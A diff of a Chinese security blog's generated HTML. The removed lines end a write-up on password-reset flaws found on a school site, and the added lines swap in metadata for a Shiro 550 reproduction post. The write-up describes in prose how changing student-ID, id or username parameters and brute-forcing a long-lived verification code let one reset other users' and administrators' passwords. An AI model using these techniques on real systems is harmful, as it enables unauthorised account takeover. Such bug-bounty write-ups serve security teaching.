+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/7.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>可以看到带有学号，试想假如修改成别人的学号是不是能修改别人的密码呢，不多说开干</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/6.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/8.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>修改成了180068，然后发包</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/7.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
-
-<p>功夫不负有心人，修改成功，而且学号那里也变成了180068</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/8.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
-
-<p>只要抓包去跑一下，根据学号的排序规则，构造学号，可以修改全院学生的密码</p>
-<h1 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h1><p>在挖掘密码重置漏洞的时候，主要是在密码修改处，注意它传的参数等，下面我举几个例子</p>
-<h2 id="带有id等类似参数"><a href="#带有id等类似参数" class="headerlink" title="带有id等类似参数"></a>带有id等类似参数</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/9.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
-
-<p>这里只要修改id，即可修改对方的密码。假如管理员的id是1，那么就可以修改管理员的密码了</p>
-<h2 id="带有username等类似参数"><a href="#带有username等类似参数" class="headerlink" title="带有username等类似参数"></a>带有username等类似参数</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/10.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
-
-<p>我在挖这个的时候，普通账号登录之后是可以看到管理员的用户名的，所以修改管理员的密码轻而易举。 </p>
-<h2 id="验证码长期有效"><a href="#验证码长期有效" class="headerlink" title="验证码长期有效"></a>验证码长期有效</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/11.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
-
-<p>只要抓包跑验证码，就可以修改对方的密码。</p>
-<p><strong>圈子投稿文章，原文：<a target="_blank" rel="noopener" href="https://www.secquan.org/Discuss/1070616">https://www.secquan.org/Discuss/1070616</a></strong></p>
 
 	</div>
 
@@ -690,7 +677,7 @@
 	
 		<div class="post-tags">
 			<i class="fa fa-tags" aria-hidden="true"></i>
-			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/SRC/" rel="tag">SRC</a><a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
+			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
 		</div>
 	
 </article>
@@ -732,7 +719,7 @@
 				<span class="btn-inner--icon"><i class="fa fa-twitter"></i></span>
 			</button>
 		</a>
-		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://example.com/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/&text=记一次从信息泄露到密码重置-挖掘思路" tooltip="分享到 Telegram">
+		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://example.com/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/&text=Shiro 550复现" tooltip="分享到 Telegram">
 			<button class="btn btn-icon btn-primary" style="background: #42a5f5;border: none;">
 				<span class="btn-inner--icon"><i class="fa fa-telegram"></i></span>
 			</button>
@@ -749,13 +736,11 @@
 </div>
 <script type="text/javascript">
 	socialShare("#share", {
-	    title : '记一次从信息泄露到密码重置-挖掘思路',
-	    description : '起因在挖EDUSRC的时候无意中点到的一个站点
-
-当看到初始密码为8位生日的时候，立即想到了信息收集...',
+	    title : 'Shiro 550复现',
+	    description : '前言Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架...',
 	    wechatQrcodeTitle : "分享到微信",
 	    wechatQrcodeHelper : '微信扫描二维码',
-	    source : 'http://example.com/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/'
+	    source : 'http://example.com/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/'
 	});
 	$("#share_show")[0].onclick = function(){
 		$("#share_container").addClass("opened");
@@ -819,7 +804,7 @@
 </div>
 
 
-
+<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"><span class="page-navigation-extra-text"><i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>上一篇</span><a href="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/" rel="prev"> 基于flash的上传</a></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="next"> 记一次内网渗透</a></div></div>
 
 
 
